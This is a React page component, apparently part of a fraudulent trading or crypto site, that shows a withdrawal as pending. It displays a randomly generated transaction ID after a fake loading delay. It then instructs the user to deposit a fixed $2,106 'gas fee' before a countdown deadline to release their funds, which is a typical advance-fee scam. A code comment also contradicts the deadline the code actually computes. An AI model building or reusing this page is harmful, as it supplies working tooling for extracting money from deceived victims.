import React, { useEffect, useState } from "react";
import { useLocation } from "react-router-dom";

export default function WithdrawalPending() {
  const location = useLocation();
  const state = location.state || {};
  const method = state.method || "Wire Transfer";
  const amount = state.amount || 0;
  const [loading, setLoading] = useState(true);

  // Generate random transaction ID
  const transactionId = "TXN-" + Math.floor(Math.random() * 1000000000);

  useEffect(() => {
    const timer = setTimeout(() => setLoading(false), 2000);
    return () => clearTimeout(timer);
  }, []);

  // Deposit deadline (6 hours from now)
  const depositDeadline = new Date(Date.now() + 24 * 60 * 60 * 1000);

  // Withdrawal timeline (15 minutes after deposit deadline)
  const withdrawalTimeline = new Date(
    depositDeadline.getTime() + 15 * 60 * 1000
  );

  if (loading) {
    // Full page loader
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-100">
        <div className="w-16 h-16 border-4 border-indigo-600 border-t-transparent rounded-full animate-spin"></div>
      </div>
    );
  }

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-50">
      <div className="max-w-3xl w-full bg-white shadow-lg rounded-lg p-10">
        <h1 className="text-4xl font-bold text-center text-indigo-700 mb-8">
          Withdrawal Details
        </h1>

        <div className="space-y-6 text-lg text-gray-800">
          <p>
            <strong>Transaction ID:</strong> {transactionId}
          </p>
          <p>
            <strong>Method:</strong> {method}
          </p>
          <p>
            <strong>Wire Transfer Amount:</strong> ${amount}
          </p>
          <p>
            <strong>Deposit Deadline:</strong>{" "}
            {depositDeadline.toLocaleString()}
          </p>
          <p>
            <strong>Withdrawal Timeline:</strong>{" "}
            {withdrawalTimeline.toLocaleString()}
          </p>
          <p className="mt-6 text-red-600 font-semibold text-center">
            Instruction: Please deposit <strong>$2,106</strong> into your
            account as gas fee before{" "}
            <strong>{depositDeadline.toLocaleString()}</strong>
            to complete the withdrawal.
          </p>
        </div>
      </div>
    </div>
  );
}
